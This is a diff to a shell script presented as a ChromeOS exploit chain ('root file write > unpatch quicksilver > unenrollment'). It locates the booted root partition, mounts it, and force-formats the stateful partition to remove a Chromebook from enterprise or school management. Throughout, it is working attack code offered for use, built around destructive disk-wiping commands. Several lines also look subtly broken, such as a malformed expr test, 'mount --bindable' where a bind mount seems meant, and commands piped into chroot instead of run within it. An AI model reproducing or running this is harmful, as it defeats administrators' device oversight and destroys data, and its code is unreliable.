@@ -36,19 +36,38 @@ get_fixed_dst_drive() {
 	echo "${dev}"
 }
 
+get_booted_kernnum() {
+    if $(expr $(cgpt show -n "$intdis" -i 2 -P) > $(cgpt show -n "$intdis" -i 4 -P)); then
+        echo -n 2
+    else
+        echo -n 4
+    fi
+}
+get_booted_rootnum() {
+	expr $(get_booted_kernnum) + 1
+}
+
 wipeandmountstate(){
-    vgchange -ay
+  mkdir -p /localroot 
+	mount ${intdis}${intdis_prefix}$(get_booted_rootnum) /localroot -o ro
+	for rootdir in dev proc run sys; do
+		mount --bindable "${rootdir}" /localroot/"${rootdir}"
+	done  
+	(
+		export PATH="/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
+		vgchange -ay
     volgroup=$(vgscan | grep "Found volume group" | awk '{print $4}' | tr -d '"')
-	if [ -b "/dev/$volgroup/unencrypted" ]; then
-		echo "found volume group: $volgroup"
-		mkdir "$stateful_mount"
-		mkfs.ext4 -F /dev/$volgroup/unencrypted
-        mount /dev/$volgroup/unencrypted "$stateful_mount"
-	else
-		echo "lvm fail, falling back on p1"
-		mkfs.ext4 -F "$intdis_prefix"1 || fail "no stateful could be found/wiped"
-        mount "$intdis_prefix"1 "$stateful_mount"
-	fi
+		if [ -b "/dev/$volgroup/unencrypted" ]; then
+			echo "found volume group: $volgroup"
+			mkdir "$stateful_mount"
+			mkfs.ext4 -F /dev/$volgroup/unencrypted
+    	mount /dev/$volgroup/unencrypted "$stateful_mount"
+		else
+			echo "lvm fail, falling back on p1"
+			mkfs.ext4 -F "$intdis_prefix"1 || fail "no stateful could be found/wiped"
+      mount "$intdis_prefix"1 "$stateful_mount"
+		fi
+	) | chroot /localroot
 }
 
 checkcurrentstate(){
@@ -91,18 +110,18 @@ part2(){
 }
 
 main(){
-    . /usr/sbin/write_gpt.sh
-    load_base_vars
-    intdis=$(get_fixed_dst_drive)
+  . /usr/sbin/write_gpt.sh
+  load_base_vars
+  intdis=$(get_fixed_dst_drive)
 	if echo "$intdis" | grep -q '[0-9]$'; then
 		intdis_prefix="$intdis"p
 	else
 		intdis_prefix="$intdis"
 	fi
-    clear
-    echo "2icksilver, root file write > unpatch quicksilver > unenrollment"
+  clear
+  echo "2icksilver, root file write > unpatch quicksilver > unenrollment"
 	echo "Exploit by emery, script by con"
-    checkcurrentstate
+  checkcurrentstate
 }
 
 main
